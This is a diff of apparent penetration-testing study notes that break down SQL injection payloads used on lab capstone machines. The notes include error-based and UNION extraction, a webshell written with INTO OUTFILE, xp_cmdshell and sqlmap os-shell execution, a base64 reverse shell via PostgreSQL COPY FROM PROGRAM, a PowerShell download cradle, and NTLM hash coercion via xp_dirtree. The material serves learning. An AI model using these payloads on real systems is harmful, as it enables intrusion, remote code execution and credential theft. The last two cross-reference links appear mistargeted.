@@ -1,7 +1,7 @@
 
 # SQL Injection, Command Breakdowns
 
-Full teardowns of the SQLi payloads used across [[SQL Injection Attacks]] and the boxes that reused them. See [[COMMAND BREAKDOWNS]] for the entry format and what this file is for.
+Full teardowns of the SQLi payloads used across [[10. SQL Injection Attacks|SQL Injection Attacks]] and the boxes that reused them. See [[COMMAND BREAKDOWNS]] for the entry format and what this file is for.
 
 ---
 
@@ -26,14 +26,14 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT g
 - `-- -` → a SQL line comment. `--` needs a trailing space to count as a comment start in MySQL, and that space often gets silently trimmed by whatever's between you and the database (URL decoding, PHP, etc.), so the extra dummy `-` guarantees a real space survives before it. This comments out whatever the original query template had left over after our injection point (the closing `')` and any trailing SQL), so the statement still parses even though we never supplied a matching quote/paren ourselves.
 - `| grep -i "XPATH"` → the server doesn't return anything structured (no JSON, no clean error page), it returns the *entire normal HTML page* with the raw MySQL error text dumped in wherever the form-handling PHP's uncaught exception happens to get echoed. That's one line buried in a page full of `<div>`s, CSS, nav bars, etc. `grep -i "XPATH"` is what actually finds it, MySQL's error for this always contains the literal string `XPATH syntax error`, case can vary slightly by version hence `-i`.
 
-**Caveat:** `extractvalue()` (and its sibling `updatexml()`) truncates the returned string to 32 characters total, marker included. Longer values need to be paged with `substring((SELECT ...), start, 31)`, bumping `start` by 31 each call. See [[SQL Injection Attacks#Capstone: Exercise VM #2|Capstone VM #2]] step 9 for this in use against `LOAD_FILE()` output.
+**Caveat:** `extractvalue()` (and its sibling `updatexml()`) truncates the returned string to 32 characters total, marker included. Longer values need to be paged with `substring((SELECT ...), start, 31)`, bumping `start` by 31 each call. See [[10. SQL Injection Attacks#Capstone: Exercise VM #2|Capstone VM #2]] step 9 for this in use against `LOAD_FILE()` output.
 
 **Where this comes from:** PortSwigger's SQL Injection Cheat Sheet has this under its "Extracting data via error messages" section (search page for `extractvalue`). HackTricks (book.hacktricks.xyz → Pentesting Web → SQL Injection page) has a MySQL-specific "Error based" section with this exact pattern and the 32-char truncation note. PayloadsAllTheThings' `SQL Injection/` folder has ready-to-copy templates for both `extractvalue` and `updatexml` if one gets filtered by a WAF.
 > 🔗 Full technique writeup: HackTricks · 🔗 Payload/bypass reference: PayloadsAllTheThings
 
 **Where to look in the response:** don't assume the error comes back "clean." It's stitched into the same HTML the homepage normally returns, so eyeballing it in a browser means scrolling past the whole page looking for one out-of-place sentence. Worth doing once with `curl -s ... | less` (or Burp's Response tab) just to *see* it sitting there mid-page and build that mental picture, then defaulting to `grep -i "XPATH"` (or whatever your DB engine's error keyword is, e.g. `"error in your SQL syntax"` for a plain syntax error) every time after that so you're not scanning HTML by eye.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], steps 7-9. Same underlying idea as the [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1 error-based section]], just against an `INSERT` instead of a `SELECT`, and manual instead of sqlmap.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], steps 7-9. Same underlying idea as the [[10. SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1 error-based section]], just against an `INSERT` instead of a `SELECT`, and manual instead of sqlmap.
 
 #### Tags: #SQLInjection #ErrorBased #MySQL #CommandBreakdowns
 
@@ -56,7 +56,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT g
 
 **Where to look in the response:** unlike the `extractvalue()` case, this one is version/config dependent, some MySQL configurations show the full "Subquery returns more than 1 row" or "Operand should contain 1 column(s)" style error with the value inline, others just show a generic failure. Test it against a known-value subquery first (e.g. `select @@version`) so you know what a *working* leak actually looks like on this specific target before trusting it against unknown data.
 
-🔁 **Seen in:** [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|SQL Injection Attacks, 10.2.1]], steps 4-7.
+🔁 **Seen in:** [[10. SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|SQL Injection Attacks, 10.2.1]], steps 4-7.
 
 #### Tags: #SQLInjection #ErrorBased #MySQL #CommandBreakdowns
 
@@ -83,7 +83,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT g
 
 **Where to look in the response:** don't just check for an error, check for **silent absence**. A column that should show your placeholder but doesn't isn't necessarily broken, it's often a type mismatch quietly swallowing your output. Compare the full rendered page against a known-good baseline request side by side rather than assuming "no error" means "it worked."
 
-🔁 **Seen in:** [[SQL Injection Attacks#10.2.2. UNION-Based Payloads|SQL Injection Attacks, 10.2.2]], steps 1-4.
+🔁 **Seen in:** [[10. SQL Injection Attacks#10.2.2. UNION-Based Payloads|SQL Injection Attacks, 10.2.2]], steps 1-4.
 
 #### Tags: #SQLInjection #UnionSQLi #MySQL #CommandBreakdowns
 
@@ -104,7 +104,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring
 
 **Where to look in the response:** same as the parent entry, grep for the DB engine's error marker (`XPATH syntax error` for MySQL's XML functions). The payload here is longer, so double-check the response isn't getting truncated somewhere between curl and your terminal (redirect to a file with `-o` instead of piping through `grep` if a result ever looks suspiciously short).
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], step 9.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], step 9.
 
 #### Tags: #SQLInjection #ErrorBased #FileRead #LoadFile #CommandBreakdowns
 
@@ -127,7 +127,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring
 
 **Where to look in the response:** the app's own HTTP response will look like a failure (a type-mismatch error page), that's expected and not a signal either way. The real confirmation is a separate request straight to the file you wrote, e.g. `curl "http://<target>/tmp/webshell.php?cmd=id"`, treat the UNION request and the confirmation request as two independent checks.
 
-🔁 **Seen in:** [[SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MySQL section), and its companion [[SQL Injection & Databases|Command Appendix's SQL Injection Payloads]] entry.
+🔁 **Seen in:** [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MySQL section), and its companion [[SQL Injection & Databases|Command Appendix's SQL Injection Payloads]] entry.
 
 #### Tags: #SQLInjection #IntoOutfile #MySQLWebshell #CommandBreakdowns
 
@@ -154,7 +154,7 @@ EXECUTE xp_cmdshell 'whoami';
 
 **Where to look in the response:** once enabled, `xp_cmdshell`'s output comes back as normal query result rows (one row per line of stdout), no special parsing needed, it looks just like any other `SELECT` result set in whatever client you're using (`impacket-mssqlclient`, `sqlcmd`, or through a SQLi channel).
 
-🔁 **Seen in:** [[SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MSSQL section), and its companion [[SQL Injection & Databases|Command Appendix]] entry.
+🔁 **Seen in:** [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MSSQL section), and its companion [[SQL Injection & Databases|Command Appendix]] entry.
 
 #### Tags: #SQLInjection #XpCmdshell #MSSQL #CommandBreakdowns
 
@@ -178,7 +178,7 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 
 **Where to look in the response:** sqlmap prints its own structured output (technique confirmed, DBMS fingerprint, dumped rows in a table) directly to the terminal, no response-scraping needed on your end, that's the whole point of automating it. The one thing worth watching for manually is the **prompt for backend language** (PHP/ASP/ASPX/JSP) during `--os-shell`, get that wrong and the stager it writes won't execute even though the file upload itself succeeds.
 
-🔁 **Seen in:** [[SQL Injection Attacks#10.3.2. Automating the Attack|SQL Injection Attacks, 10.3.2]].
+🔁 **Seen in:** [[10. SQL Injection Attacks#10.3.2. Automating the Attack|SQL Injection Attacks, 10.3.2]].
 
 #### Tags: #SQLInjection #Sqlmap #CommandBreakdowns
 
@@ -202,7 +202,7 @@ curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT vers
 
 **Where to look in the response:** same pattern as the MySQL entries, grep the full HTML response for the error keyword rather than reading the page by eye. One genuine advantage over MySQL's `extractvalue()`: **no 32-character truncation**, a `string_agg()` of an entire table can come back in a single request instead of needing `LIMIT`-based row-by-row paging.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 8-10.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 8-10.
 
 #### Tags: #SQLInjection #ErrorBased #PostgreSQL #CommandBreakdowns
 
@@ -228,7 +228,7 @@ curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT stri
 
 **Where to look in the response:** the first (setup) request typically returns silently, a normal-looking page with no error, that's success, not failure, since `COPY FROM PROGRAM` doesn't echo anything back directly. Confirmation only comes from the follow-up read-back request, grep that one for the error-marker text same as every other entry here.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 11-12.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 11-12.
 
 #### Tags: #SQLInjection #PostgreSQL #RCE #StackedQueries #CommandBreakdowns
 
@@ -248,13 +248,13 @@ curl -X POST --data-urlencode "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFza
 **Piece by piece:**
 - Why base64 the reverse shell at all → the raw payload has quotes nested three layers deep (shell string, SQL string literal, HTTP form value), base64-encoding it collapses all of that into one clean alphanumeric-plus-`+/=` string with no characters that could break out of any of those layers early.
 - Why the base64 itself broke → `curl --data` sends the value **exactly as typed**, with no encoding applied. The HTTP `Content-Type` for a plain `--data` POST is `application/x-www-form-urlencoded`, a format where a literal `+` character is a **reserved meta-character meaning "space"** (this is why URLs use `+` for spaces in query strings). Base64's alphabet includes `+` as a normal output character, standard base64 output routinely contains it. Since curl doesn't encode the value, any `+` in the base64 string arrives at the server having already been silently reinterpreted as a space by the time PHP decodes the POST body, corrupting the payload before it's even base64-decoded.
-- `--data-urlencode` → percent-encodes the entire value before sending (`+` becomes `%2B`, along with every other reserved character), so it survives the round trip intact. This is the general fix, the same one already needed for the `&` characters in a plain bash reverse shell one-liner back in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s troubleshooting note, both are instances of the same root cause: `--data` sends raw, `--data-urlencode` doesn't.
+- `--data-urlencode` → percent-encodes the entire value before sending (`+` becomes `%2B`, along with every other reserved character), so it survives the round trip intact. This is the general fix, the same one already needed for the `&` characters in a plain bash reverse shell one-liner back in [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s troubleshooting note, both are instances of the same root cause: `--data` sends raw, `--data-urlencode` doesn't.
 
 **Where this comes from:** curl's own man page documents `--data` as sending the value "exactly as specified" versus `--data-urlencode`, which "is the same as --data, except that this performs URL-encoding." RFC 1866 (the original HTML form-encoding spec) defines `+` as the encoded form of a space within `application/x-www-form-urlencoded` bodies, general web-fundamentals knowledge rather than an OSCP-specific trick, but one that bites reverse-shell delivery constantly since so many payloads end up base64 or otherwise `+`-containing.
 
 **Where to look in the response:** if a payload that looks correct locally produces a garbled/nonsensical error on the target (like a base64 string with gaps where `+` should be, or a shell command failing with a syntax error that doesn't match what was sent), diff the sent value character-by-character against what the server's error message echoes back, rather than assuming the technique itself is wrong.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], Step 13.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], Step 13.
 
 #### Tags: #ReverseShell #DataUrlencode #CommandBreakdowns
 
@@ -284,7 +284,7 @@ offsec'; SELECT 1/0--
 
 **Where to look in the response:** nothing to grep for here, that's the finding, the *absence* of any exception text (even for a guaranteed `1/0`) is itself the diagnostic signal. Once confirmed, stop trying to read stacked-query results through the HTTP response and switch to an out-of-band confirmation method instead.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Steps 7-9.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Steps 7-9.
 
 #### Tags: #MSSQL #StackedQueries #DebuggingMethodology #CommandBreakdowns
 
@@ -308,7 +308,7 @@ offsec'; SELECT 1/0--
 
 **Where to look in the response:** nothing to look for in the HTTP response, per the entry above, stacked-statement results/errors don't surface on this app at all. Confirmation is entirely out-of-band: a `GET /shell.ps1` hit on your Python HTTP server's log, followed by a connection on your `nc` listener. If the web server never gets hit, suspect a quoting mismatch (one layer's delimiter leaking into another) breaking the command before it ever runs, rather than a network/firewall issue.
 
-🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Step 10.
+🔁 **Seen in:** [[10. SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Step 10.
 
 #### Tags: #MSSQL #XpCmdshell #PowerShell #DownloadCradle #QuotingEscaping #CommandBreakdowns
 
@@ -341,7 +341,7 @@ The output is a Net-NTLMv2 hash (same format as Responder captures). Crack offli
 
 **Where this comes from:** The `xp_dirtree` UNC coercion technique is well-documented in HackTricks and PayloadsAllTheThings. The underlying mechanism is Windows' automatic NTLM auth for any UNC path, same root cause as Responder LLMNR poisoning, just triggered via a database proc instead of a broadcast.
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL, xp_dirtree UNC Hash Coercion|CS.6]]
+🔁 [[06. Information Gathering|CS.6]]
 
 ---
 
@@ -371,7 +371,7 @@ EXECUTE ('EXECUTE (''EXECUTE (''''xp_cmdshell ''''''''whoami'''''''''''') AT [IN
 
 **Where this comes from:** MSSQL T-SQL documentation on string literal escaping and the `EXECUTE...AT` distributed query syntax.
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL. Linked Server Execution|CS.9]]
+🔁 [[06. Information Gathering|CS.9]]
 
 ## **Outstanding**
 - [x] UNION-based extraction, `INTO OUTFILE` webshell drop, `xp_cmdshell` (MSSQL), sqlmap `--technique`/`--os-shell` internals, done 2026-08-04.
